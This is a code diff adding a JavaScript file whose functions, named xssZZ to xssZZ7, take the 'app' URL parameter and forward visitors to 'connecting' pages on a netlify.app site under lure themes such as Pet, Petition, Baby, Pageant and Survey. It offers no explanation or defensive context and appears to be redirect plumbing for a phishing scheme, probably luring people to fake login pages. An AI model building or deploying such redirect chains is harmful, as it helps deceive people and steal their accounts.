@@ -1,0 +1,51 @@
+const myParam2 = "zeno-zone";
+const myParam3 = "/URSA";
+
+function xssZZ() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+
+window.location = "https://"+ myParam2+".netlify.app"+myParam3+"/Art/connecting?app="+ myParam;
+}
+
+function xssZZ2() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+window.location = "https://"+ myParam2+".netlify.app"+myParam3+"/Pet/connecting?app="+ myParam;
+}
+
+function xssZZ22() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+window.location = "https://"+ myParam2+".netlify.app"+myParam3+"/Pet/connecting?app="+ myParam;
+}
+
+function xssZZ3() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+window.location = "https://"+ myParam2+".netlify.app"+myParam3+"/Petition/connecting?app="+ myParam;
+}
+
+function xssZZ4() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+window.location = "https://"+ myParam2+".netlify.app"+myParam3+"/PiPho/connecting?app="+ myParam;
+}
+
+function xssZZ5() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+window.location = "https://"+ myParam2+".netlify.app"+myParam3+"/Baby/connecting?app="+ myParam;
+}
+
+function xssZZ6() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+window.location = "https://"+ myParam2+".netlify.app"+myParam3+"/Pageant/connecting?app="+ myParam;
+}
+
+function xssZZ7() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+window.location = "https://"+ myParam2+".netlify.app"+myParam3+"/Survey/connecting?app="+ myParam;
+}
